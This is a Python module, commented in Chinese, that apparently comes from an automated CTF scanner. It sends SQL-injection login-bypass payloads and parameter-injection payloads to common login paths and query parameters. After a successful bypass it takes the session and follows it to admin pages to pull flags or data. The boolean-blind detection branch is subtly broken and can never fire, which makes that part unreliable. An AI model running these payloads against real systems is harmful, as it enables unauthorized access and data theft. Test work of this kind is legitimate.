"""SQL 注入检测：登录绕过 + 参数注入（布尔/报错/时间盲注/UNION 探测）。"""
from __future__ import annotations

from ..common import (Candidate, body_of, extract_flag, extract_session,
                      follow_session, get, post)

# 登录表单注入载荷（' or '1'='1 -- 经典认证绕过）
LOGIN_PAYLOADS = [
    ("' or '1'='1' -- ", "x"),
    ("' or '1'='1'#", "x"),
    ("admin' -- ", "x"),
    ("1' or '1'='1' -- ", "1"),
]

# 参数注入探测对：(正常值, 注入值)。响应差异 → 可疑
PARAM_PAIRS = [
    ("1", "1'"),
    ("1", "1' AND '1'='1"),
    ("1", "1' AND '1'='2"),
    ("1", "1 OR 1=1"),
    ("1", "1' OR '1'='1"),
    ("1", "1 UNION SELECT 1,2,3"),
    ("1", "1\" OR \"1\"=\"1"),
    ("1", "1' AND SLEEP(2) -- "),
]

# 常见注入参数名
PARAM_NAMES = ["id", "uid", "user_id", "order", "type", "cat", "cid", "pid",
               "page", "limit", "goods_id", "article_id", "file_id", "sid"]


def run(ctx) -> list[Candidate]:
    out: list[Candidate] = []
    base = ctx["base"].rstrip("/")
    out += _login_bypass(ctx, base)

    # 从主页/已知路径收集 GET 参数（先试常见参数名在 / 和 /api 上）
    for path in ("/", "/api", "/api/v1", "/list", "/index"):
        if ctx["time_left"]() <= 0:
            break
        for pname in PARAM_NAMES:
            if ctx["time_left"]() <= 0:
                break
            cand = _probe_param(ctx, base, path, pname)
            if cand:
                out.append(cand)
                break  # 一个参数命中即可，继续下个路径
    return out


def _login_bypass(ctx, base: str) -> list[Candidate]:
    out: list[Candidate] = []
    for form_path in ("/login", "/api/login", "/auth/login", "/user/login", "/signin"):
        if ctx["time_left"]() <= 0:
            break
        resp = post(base + form_path, ctx["timeout"],
                    data={"user": "u", "pass": "p"})
        if resp is None or resp.status_code not in (200, 401, 302):
            continue
        for user, pwd in LOGIN_PAYLOADS:
            r = post(base + form_path, ctx["timeout"],
                     data={"user": user, "pass": pwd})
            if r is None:
                continue
            body = body_of(r)
            flag = extract_flag(body)
            # 注入后从 401 变 200/302 → 认证绕过
            if flag or (r.status_code in (200, 302) and resp.status_code == 401):
                note = f"注入载荷 {user!r} 使 401→{r.status_code}"
                # 漏洞链：提取会话 → 跟随访问管理页抓 flag
                session = extract_session(body)
                if session:
                    followed = follow_session(base, session, ctx["timeout"])
                    if followed:
                        url2, body2, note2 = followed
                        flag = flag or extract_flag(body2)
                        return [Candidate(
                            type="sqli", url=f"{base}{form_path} → {url2}",
                            request=f"POST {form_path} user={user!r} + session-follow",
                            response=(flag or body2)[:300],
                            impact="SQL 注入登录绕过 → 会话 → 管理页数据泄露",
                            confidence=0.95 if flag else 0.8,
                            value=flag,
                            confirm={"note": f"{note}; {note2}"},
                        )]
                return [Candidate(
                    type="sqli", url=base + form_path,
                    request=f"POST {form_path} user={user!r}",
                    response=(flag or body)[:300],
                    impact="SQL 注入登录绕过（认证规避）",
                    confidence=0.9 if flag else 0.75,
                    value=flag,
                    confirm={"note": note},
                )]
    return out


def _probe_param(ctx, base: str, path: str, pname: str) -> Candidate | None:
    """对单个参数做差异探测：正常 vs 单引号/恒真/恒假。"""
    r0 = get(base + path, ctx["timeout"], params={pname: "1"})
    if r0 is None:
        return None
    b0 = body_of(r0)
    for probe, payload in PARAM_PAIRS:
        if ctx["time_left"]() <= 0:
            return None
        r = get(base + path, ctx["timeout"], params={pname: payload})
        if r is None:
            continue
        body = body_of(r)
        flag = extract_flag(body)
        if flag:
            return Candidate(
                type="sqli", url=f"{base}{path}?{pname}={payload}",
                request=f"GET {path}?{pname}={probe!r}",
                response=body[:300],
                impact=f"SQL 注入 {pname} 参数获取 flag",
                confidence=0.95, value=flag,
                confirm={"note": "注入载荷直接命中 flag"},
            )
        # 布尔差异：恒真 vs 恒假 响应不同（且与基线不同）→ 疑似注入
        if payload == "1' AND '1'='2":
            continue  # 由恒真/恒假对判断
        if probe == "1' AND '1'='1" and body == b0:
            r_false = get(base + path, ctx["timeout"], params={pname: "1' AND '1'='2"})
            if r_false is not None and body_of(r_false) != body and body != "":
                return Candidate(
                    type="sqli", url=f"{base}{path}?{pname}={payload}",
                    request=f"GET {path}?{pname}=1",
                    response=body[:300],
                    impact=f"布尔盲注 {pname} 参数（恒真/恒假响应差异）",
                    confidence=0.8,
                    confirm={"note": "恒真与恒假响应存在差异"},
                )
    return None
